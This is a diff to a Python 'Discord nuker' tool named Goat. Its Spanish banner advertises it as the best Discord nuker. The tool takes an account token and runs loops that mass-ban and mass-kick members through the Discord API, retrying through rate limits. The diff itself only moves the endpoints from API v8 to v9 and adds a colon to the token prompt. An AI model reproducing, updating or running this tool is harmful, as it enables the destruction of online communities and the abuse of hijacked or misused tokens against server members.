@@ -75,7 +75,7 @@ banner = f"""
 """
 print(Center.XCenter(Colorate.Vertical(Colors.black_to_red, banner, 1)))
 print(Center.XCenter(Colorate.Color(Colors.dark_red, Box.Lines("Bienvenid@ a Goat, el mejor Nuker de Discord"), 1)))
-token = input(Colorate.Color(Colors.dark_red, '[>] Token '))
+token = input(Colorate.Color(Colors.dark_red, '[>] Token: '))
 
 
 headers = {'Authorization': f'{token}'}
@@ -93,7 +93,7 @@ class GOAT:
         print(Colorate.Color(Colors.dark_red, f'[') + "-" + Colorate.Color(Colors.dark_red, f']') + text)
     def BanMembers(self, guild, member):
         while True:
-            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
+            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
             if 'retry_after' in r.text:
                 time.sleep(r.json()['retry_after'])
             else:
@@ -105,7 +105,7 @@ class GOAT:
 
     def KickMembers(self, guild, member):
         while True:
-            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
+            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers)
             if 'retry_after' in r.text:
                 time.sleep(r.json()['retry_after'])
             else:
